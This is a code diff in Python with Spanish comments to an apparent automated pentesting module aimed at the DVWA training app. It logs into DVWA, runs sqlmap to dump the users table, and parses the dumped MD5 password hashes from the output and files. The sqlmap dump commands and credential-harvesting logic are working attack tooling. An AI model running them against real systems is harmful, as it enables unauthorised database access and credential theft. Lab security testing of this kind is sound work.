@@ -1,5 +1,6 @@
 import subprocess
 import re
+import os
 import requests
 from pathlib import Path
 from config import Config
@@ -46,157 +47,109 @@ class SQLMapInjector:
             rprint(f"   [yellow]⚠️ Login DVWA fallido: {e}[/yellow]")
             return None
 
-    def _parse_credentials_from_stdout(self, stdout_text):
-        """Extraer credenciales directamente del stdout de SQLMap"""
+    def _find_all_credentials(self, output_dir, full_output):
+        """Buscar credenciales en TODOS los sitios posibles"""
         creds = []
 
-        # Patrón 1: Tabla SQLMap con | user | password/hash |
-        # SQLMap muestra tablas así:
-        # +----+----------+----------------------------------+
-        # | .. | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 |
-        # +----+----------+----------------------------------+
-        rows = re.findall(
-            r'\|\s*(?:\d+\s*\|)?\s*(\w+)\s*\|\s*([a-fA-F0-9]{32})\s*\|',
-            stdout_text
-        )
-        for user, hash_val in rows:
-            if user.lower() not in ['user', 'username', 'field', 'first_name', 'last_name', 'avatar']:
-                creds.append({
-                    'source': 'SQLMap (DVWA)',
-                    'user': user,
-                    'password': hash_val,
-                    'hash': hash_val,
-                    'cracked': False
-                })
+        # ══════════════════════════════════════
+        # 1. BUSCAR EN ARCHIVOS CSV DE DUMP
+        # SQLMap guarda CSVs en: output_dir/IP/dump/DB/TABLE.csv
+        # ══════════════════════════════════════
+        for root, dirs, files in os.walk(str(output_dir)):
+            for fname in files:
+                fpath = Path(root) / fname
 
-        # Patrón 2: user, password columns en formato CSV inline
-        # [INFO] fetched data logged to text files under '/output/...'
-        # Table: users
-        # [5 entries]
-        csv_rows = re.findall(
-            r'(?:admin|user\d*|[a-zA-Z]+)\s*,\s*[a-fA-F0-9]{32}',
-            stdout_text
-        )
-        for row in csv_rows:
-            parts = row.split(',')
-            if len(parts) >= 2:
-                user = parts[0].strip()
-                hash_val = parts[1].strip()
-                if user.lower() not in ['user', 'username'] and not any(c['user'] == user for c in creds):
-                    creds.append({
-                        'source': 'SQLMap (DVWA)',
-                        'user': user,
-                        'password': hash_val,
-                        'hash': hash_val,
-                        'cracked': False
-                    })
+                # Leer cualquier archivo CSV o de dump
+                if fname.endswith('.csv') or 'dump' in root.lower() or 'users' in fname.lower():
+                    try:
+                        content = fpath.read_text(errors='ignore').strip()
+                        if not content:
+                            continue
+                        rprint(f"   [cyan]📄 Archivo encontrado: {fpath.name}[/cyan]")
 
-        # Patrón 3: SQLMap a veces muestra "password hash: MD5..."
-        pass_matches = re.findall(
-            r"'(\w+)'\s*:\s*'([a-fA-F0-9]{32})'",
-            stdout_text
-        )
-        for user, hash_val in pass_matches:
-            if not any(c['user'] == user for c in creds):
-                creds.append({
-                    'source': 'SQLMap (DVWA)',
-                    'user': user,
-                    'password': hash_val,
-                    'hash': hash_val,
-                    'cracked': False
-                })
+                        lines = content.split('\n')
+                        for line in lines:
+                            # Buscar hashes MD5 en cualquier línea
+                            md5_matches = re.findall(r'([a-fA-F0-9]{32})', line)
+                            if md5_matches:
+                                # Extraer username de la misma línea
+                                # Formatos posibles: user,hash | user,,hash | "user","hash"
+                                clean = line.replace('"', '').replace("'", '')
+                                parts = re.split(r'[,\t|]+', clean)
+                                parts = [p.strip() for p in parts if p.strip()]
 
-        # Patrón 4: Buscar en las líneas que contienen "admin" seguido de un hash
-        for line in stdout_text.split('\n'):
-            match = re.search(r'(?:^|\|)\s*(admin\w*)\s*(?:\|.*?\|)?\s*([a-fA-F0-9]{32})', line)
-            if match and not any(c['user'] == match.group(1) and c['hash'] == match.group(2) for c in creds):
-                creds.append({
-                    'source': 'SQLMap (DVWA)',
-                    'user': match.group(1),
-                    'password': match.group(2),
-                    'hash': match.group(2),
-                    'cracked': False
-                })
+                                username = None
+                                hash_val = md5_matches[0]
 
-        return creds
-
-    def _parse_credentials_from_files(self, output_dir):
-        """Buscar credenciales en archivos de dump de SQLMap"""
-        creds = []
-
-        # SQLMap guarda en: output_dir/TARGET_IP/dump/DATABASE/TABLE.csv
-        # También puede estar directamente en output_dir/dump/...
-        search_paths = [
-            output_dir,
-            output_dir / self.host.ip,
-            output_dir / f"dump",
-        ]
-
-        for base in search_paths:
-            if not base.exists():
-                continue
-
-            # Buscar CSVs
-            for csv_file in base.rglob("*.csv"):
-                try:
-                    content = csv_file.read_text(errors='ignore')
-                    lines = content.strip().split('\n')
-                    if len(lines) < 2:
-                        continue
-
-                    # Detectar columnas de usuario/password
-                    header = lines[0].lower()
-                    has_user = any(col in header for col in ['user', 'login', 'username', 'name'])
-                    has_pass = any(col in header for col in ['pass', 'hash', 'password'])
-
-                    if has_user or has_pass:
-                        for line in lines[1:]:
-                            parts = [p.strip() for p in line.split(',')]
-                            if len(parts) >= 2:
-                                # Buscar el campo que parece un hash MD5
-                                user_val = parts[0]
-                                hash_val = ''
-                                for p in parts[1:]:
-                                    if re.match(r'^[a-fA-F0-9]{32}$', p):
-                                        hash_val = p
+                                for p in parts:
+                                    if not re.match(r'^[a-fA-F0-9]{32}$', p) and \
+                                       not re.match(r'^\d+$', p) and \
+                                       p.lower() not in ['user', 'username', 'password', 'pass',
+                                                          'first_name', 'last_name', 'avatar',
+                                                          'user_id', 'failed_login', 'last_login',
+                                                          ''] and \
+                                       len(p) > 1 and len(p) < 30 and \
+                                       not p.startswith('/') and not p.startswith('http'):
+                                        username = p
                                         break
-                                if not hash_val and len(parts) > 1:
-                                    hash_val = parts[1]
 
-                                if user_val and user_val.lower() not in ['user', 'username', 'first_name']:
-                                    if not any(c['user'] == user_val for c in creds):
-                                        creds.append({
-                                            'source': 'SQLMap (DVWA)',
-                                            'user': user_val,
-                                            'password': hash_val,
-                                            'hash': hash_val,
-                                            'cracked': False
-                                        })
-                except Exception:
-                    pass
+                                if username and not any(c['user'] == username and c['hash'] == hash_val for c in creds):
+                                    creds.append({
+                                        'source': 'SQLMap (DVWA)',
+                                        'user': username,
+                                        'password': hash_val,
+                                        'hash': hash_val,
+                                        'cracked': False
+                                    })
+                    except Exception:
+                        pass
 
-            # Buscar en archivos de log
-            for log_file in base.rglob("log"):
-                try:
-                    content = log_file.read_text(errors='ignore')
-                    stdout_creds = self._parse_credentials_from_stdout(content)
-                    for c in stdout_creds:
-                        if not any(x['user'] == c['user'] for x in creds):
-                            creds.append(c)
-                except Exception:
-                    pass
+        # ══════════════════════════════════════
+        # 2. BUSCAR EN STDOUT + STDERR
+        # ══════════════════════════════════════
+        if full_output:
+            # Patrón tabla: | algo | user | hash |
+            table_rows = re.findall(
+                r'\|[^|]*\|[^|]*?(\b\w{3,20}\b)[^|]*\|[^|]*?([a-fA-F0-9]{32})[^|]*\|',
+                full_output
+            )
+            for user, hash_val in table_rows:
+                if user.lower() not in ['user', 'username', 'password', 'field', 'column',
+                                         'first_name', 'last_name', 'avatar', 'table']:
+                    if not any(c['user'] == user and c['hash'] == hash_val for c in creds):
+                        creds.append({
+                            'source': 'SQLMap (DVWA)',
+                            'user': user,
+                            'password': hash_val,
+                            'hash': hash_val,
+                            'cracked': False
+                        })
 
-            # Buscar en archivos .txt de dump
-            for txt_file in base.rglob("*.txt"):
-                try:
-                    content = txt_file.read_text(errors='ignore')
-                    if 'admin' in content.lower() and re.search(r'[a-fA-F0-9]{32}', content):
-                        stdout_creds = self._parse_credentials_from_stdout(content)
-                        for c in stdout_creds:
-                            if not any(x['user'] == c['user'] for x in creds):
-                                creds.append(c)
-                except Exception:
-                    pass
+            # Buscar formato simple: username seguido de hash en la misma línea
+            for line in full_output.split('\n'):
+                if re.search(r'[a-fA-F0-9]{32}', line):
+                    # Ignorar líneas de info/debug de sqlmap
+                    if line.strip().startswith('[') or 'sqlmap' in line.lower():
+                        continue
+                    md5 = re.findall(r'([a-fA-F0-9]{32})', line)
+                    words = re.findall(r'\b([a-zA-Z]\w{2,15})\b', line)
+                    for word in words:
+                        if word.lower() not in ['user', 'username', 'password', 'type', 'null',
+                                                 'varchar', 'table', 'column', 'level', 'risk',
+                                                 'first_name', 'last_name', 'avatar', 'http',
+                                                 'string', 'boolean', 'blind', 'injectable',
+                                                 'parameter', 'payload', 'fetched', 'entries',
+                                                 'dump', 'database', 'found', 'data', 'text']:
+                            for h in md5:
+                                if not any(c['user'] == word and c['hash'] == h for c in creds):
+                                    creds.append({
+                                        'source': 'SQLMap (DVWA)',
+                                        'user': word,
+                                        'password': h,
+                                        'hash': h,
+                                        'cracked': False
+                                    })
+                            break  # Solo primer username por línea
 
         return creds
 
@@ -204,7 +157,6 @@ class SQLMapInjector:
         vulns = []
         rprint("   [cyan]💉 SQLMap contra DVWA...[/cyan]")
 
-        # 1. Login automático en DVWA
         cookie = self._get_dvwa_cookie()
 
         for port, service in list(self.host.ports_open.items())[:3]:
@@ -214,27 +166,45 @@ class SQLMapInjector:
             output_dir = self.sql_dir / f"sql_{self.host.ip}_{port}"
             output_dir.mkdir(exist_ok=True)
 
-            # ATAQUE PRINCIPAL: DVWA SQLi con cookie
             if cookie:
                 dvwa_url = f"http://{self.host.ip}:{port}{Config.DVWA_SQLI_URL}?id=1&Submit=Submit"
                 rprint(f"   [red]🎯 SQLMap DVWA: {dvwa_url}[/red]")
 
+                # Comando específico: dump tabla users de dvwa
                 cmd = [
                     'sqlmap', '-u', dvwa_url,
                     '--cookie', cookie,
                     '--batch', '--risk=2', '--level=2',
-                    '--dump', '--threads=3',
+                    '-D', 'dvwa', '-T', 'users',
+                    '-C', 'user,password',
+                    '--dump',
+                    '--dump-format=CSV',
+                    '--threads=3',
                     f'--output-dir={output_dir}'
                 ]
 
                 try:
-                    result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
-                    stdout = result.stdout
+                    # Capturar TANTO stdout COMO stderr
+                    result = subprocess.run(
+                        cmd,
+                        stdout=subprocess.PIPE,
+                        stderr=subprocess.STDOUT,
+                        text=True,
+                        timeout=300
+                    )
+                    full_output = result.stdout or ''
 
-                    if 'injectable' in stdout.lower() or 'dumped' in stdout.lower() or 'entries' in stdout.lower():
+                    # Guardar SIEMPRE el output completo para debug
+                    debug_file = output_dir / "sqlmap_full_output.txt"
+                    debug_file.write_text(full_output, errors='ignore')
+
+                    is_injectable = any(kw in full_output.lower() for kw in
+                                        ['injectable', 'dumped', 'entries', 'fetched'])
+
+                    if is_injectable:
                         vuln = Vulnerability(
                             name="💉 SQL INJECTION + DUMP CREDENCIALES",
-                            description=f"SQLi en DVWA: {dvwa_url} → Volcado de BD completo",
+                            description=f"SQLi en DVWA: {dvwa_url} → Volcado tabla users",
                             port=port,
                             risk=RiskLevel.CRITICAL,
                             evidence_file=str(output_dir),
@@ -243,40 +213,28 @@ class SQLMapInjector:
                         vulns.append(vuln)
                         rprint(f"   [bold red]💥 SQLi CRÍTICO + DUMP EXITOSO![/bold red]")
 
-                        # EXTRAER CREDENCIALES del stdout
-                        creds = self._parse_credentials_from_stdout(stdout)
+                    # SIEMPRE intentar extraer credenciales (del output y de archivos)
+                    creds = self._find_all_credentials(output_dir, full_output)
 
-                        # EXTRAER CREDENCIALES de archivos de dump
-                        file_creds = self._parse_credentials_from_files(output_dir)
-                        for fc in file_creds:
-                            if not any(c['user'] == fc['user'] for c in creds):
-                                creds.append(fc)
+                    if creds:
+                        self.host.credentials.extend(creds)
+                        rprint(f"\n   [bold green]{'='*50}[/bold green]")
+                        rprint(f"   [bold green]🔑 {len(creds)} CREDENCIALES EXTRAÍDAS:[/bold green]")
+                        rprint(f"   [bold green]{'='*50}[/bold green]")
+                        for c in creds:
+                            rprint(f"   [green]   👤 {c['user']} : {c['password']}[/green]")
+                    else:
+                        rprint(f"   [yellow]⚠️ No se parsearon credenciales automáticamente[/yellow]")
+                        rprint(f"   [yellow]   Output guardado: {debug_file}[/yellow]")
+                        rprint(f"   [yellow]   Revisar: cat {debug_file}[/yellow]")
 
-                        if creds:
-                            self.host.credentials.extend(creds)
-                            rprint(f"   [bold green]🔑 {len(creds)} credenciales extraídas![/bold green]")
-                            for c in creds:
-                                rprint(f"      [green]👤 {c['user']} : {c['password']}[/green]")
-                        else:
-                            # Guardar stdout para debug
-                            debug_file = output_dir / "sqlmap_stdout.txt"
-                            debug_file.write_text(stdout, errors='ignore')
-                            rprint(f"   [yellow]⚠️ Dump OK pero no se parsearon credenciales[/yellow]")
-                            rprint(f"   [yellow]   Revisa: {debug_file}[/yellow]")
-
-                            # Intentar buscar cualquier hash MD5 en el stdout
-                            all_hashes = re.findall(r'([a-fA-F0-9]{32})', stdout)
-                            if all_hashes:
-                                rprint(f"   [cyan]🔍 Hashes MD5 encontrados en stdout: {len(all_hashes)}[/cyan]")
-                                for h in set(all_hashes)[:5]:
-                                    rprint(f"      [cyan]#{h}[/cyan]")
-                                    self.host.credentials.append({
-                                        'source': 'SQLMap (raw)',
-                                        'user': 'unknown',
-                                        'password': h,
-                                        'hash': h,
-                                        'cracked': False
-                                    })
+                        # Listar archivos creados por sqlmap
+                        rprint(f"   [cyan]📁 Archivos en {output_dir}:[/cyan]")
+                        for root, dirs, files in os.walk(str(output_dir)):
+                            for f in files:
+                                fp = Path(root) / f
+                                size = fp.stat().st_size
+                                rprint(f"   [cyan]   {fp.relative_to(output_dir)} ({size} bytes)[/cyan]")
 
                 except subprocess.TimeoutExpired:
                     rprint(f"   [yellow]⏰ SQLMap timeout (300s)[/yellow]")
@@ -292,12 +250,16 @@ class SQLMapInjector:
                 cmd = [
                     'sqlmap', '-u', url,
                     '--batch', '--risk=2', '--level=2',
-                    '--dump', '--threads=3',
+                    '--dump', '--dump-format=CSV',
+                    '--threads=3',
                     f'--output-dir={fb_output}'
                 ]
 
                 try:
-                    result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
+                    result = subprocess.run(
+                        cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                        text=True, timeout=120
+                    )
                     if 'injectable' in result.stdout.lower():
                         vuln = Vulnerability(
                             name="💉 SQL INJECTION CONFIRMADA",
@@ -310,11 +272,7 @@ class SQLMapInjector:
                         vulns.append(vuln)
                         rprint(f"   [bold red]💥 SQLi CRÍTICO en {endpoint}![/bold red]")
 
-                        creds = self._parse_credentials_from_stdout(result.stdout)
-                        file_creds = self._parse_credentials_from_files(fb_output)
-                        for fc in file_creds:
-                            if not any(c['user'] == fc['user'] for c in creds):
-                                creds.append(fc)
+                        creds = self._find_all_credentials(fb_output, result.stdout)
                         if creds:
                             self.host.credentials.extend(creds)
                 except Exception:
